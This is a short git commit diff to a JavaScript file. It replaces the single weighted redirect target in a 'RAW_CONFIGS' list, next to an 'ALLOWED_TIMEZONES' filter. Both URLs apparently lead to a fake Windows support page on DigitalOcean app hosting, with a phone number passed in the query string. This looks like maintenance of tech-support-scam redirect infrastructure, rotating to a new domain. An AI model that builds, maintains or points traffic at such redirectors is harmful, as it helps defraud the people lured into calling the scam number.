def2dac32f4e9a02117b86626fd90e65aac4df47
paalakash <palaksh452@gmail.com>
2026-06-21 07:41:40 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://stingray-app-n6day.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5544", weight: 1.0 }
+    { url: "https://king-prawn-app-ejmxi.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5544", weight: 1.0 }
 
 ];
 
